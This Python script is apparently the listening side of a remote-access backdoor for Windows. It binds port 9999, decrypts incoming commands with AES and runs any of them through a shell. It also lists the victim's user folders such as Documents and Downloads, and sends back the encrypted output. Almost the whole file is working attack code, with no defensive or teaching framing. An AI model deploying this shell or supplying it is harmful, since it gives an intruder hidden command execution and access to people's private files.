import socket
import os
import subprocess
from Crypto.Cipher import AES


class Host:
    def __init__(self, port=9999, host='', s=socket.socket()):
        self.port = port
        self.host = host
        self.s = s
        self.pos = os.getcwd()

   ## Bind socket du port
    def socket_bind(self):
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error as msg:
            print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
            self.socket_bind()

    def socket_accept(self):
        conn, address = self.s.accept()
        print("Connection établie | " + "IP " + address[0] + " | Port " + str(address[1]))
        self.receive_commands(conn)
        conn.close()

    def kep(self):


        key = open(fr"{self.pos}\key\key.txt", "rb")
        self.key_aes = key.read()
        key.close()
        iv = open(fr"{self.pos}\key\iv.txt", "rb")
        self.iv_aes = iv.read()
        iv.close()
        self.key = AES.new(self.key_aes, AES.MODE_CFB, self.iv_aes)

        key2 = open(fr"{self.pos}\key\key2.txt", "rb")
        self.key_aes2 = key2.read()
        key2.close()
        iv2 = open(fr"{self.pos}\key\iv2.txt", "rb")
        self.iv_aes2 = iv2.read()
        iv2.close()
        self.key2 = AES.new(self.key_aes2, AES.MODE_CFB, self.iv_aes2)

    def sub_proc(self):
        if self.bool == True:
            cmd = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            cmd = subprocess.Popen(self.data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        cmd_bytes = cmd.stdout.read() + cmd.stderr.read()
        self.cmd_str = str(cmd_bytes, "utf-8", 'ignore')
        self.cmd_str = self.cmd_str.encode('utf-8')
        self.cmd_str = self.key2.encrypt(self.cmd_str)


    ######## receive the client commands######
    def receive_commands(self, conn):

        while True:
            self.user = os.getenv('username')
            self.bool = True
            self.kep()


            self.data = conn.recv(1024)
            self.data = self.key.decrypt(self.data)
            self.data = self.data.decode('utf-8')

            if self.data[:8] == 'get-info' and self.data[9:] == 'users':
                os.chdir('C:/Users/')
                self.command = "dir"
                Host.sub_proc(self)
                conn.send(self.cmd_str)
            elif self.data[:8] == 'get-info':
                if self.data[9:] == 'Documents' or self.data[9:] == 'Downloads' or self.data[9:] == 'Music' or self.data[9:] == 'Videos' or self.data[9:] == 'Pictures':
                    os.chdir(f'C:/Users/{self.user}/{self.data[9:]}/')
                    self.command = "dir"
                    Host.sub_proc(self)
                    conn.send(self.cmd_str)
                else:
                    msg = 'This folder does not exist'
                    msg = msg.encode('utf-8')
                    msg = self.key2.encrypt(msg)
                    conn.send(msg)
            elif self.data[:2] == 'cd' and self.data[3:] != '':
                os.chdir(self.data[3:])
                msg = "Operation success"
                msg = msg.encode('utf-8')
                msg = self.key2.encrypt(msg)
                conn.send(msg)
            elif len(self.data) > 0:
                self.bool = False
                Host.sub_proc(self)
                conn.send(self.cmd_str)
                #print(strss(data))



def main():
    h = Host()
    h.socket_bind()
    h.socket_accept()

main()


### SOURCES ####
#https://github.com/buckyroberts/Turtle/blob/master/Single_Client/server.py
#https://stackoverflow.com/questions/31756166/python-3-socket-chat-encryption-with-pycrypto-gives-unicodedecodeerror

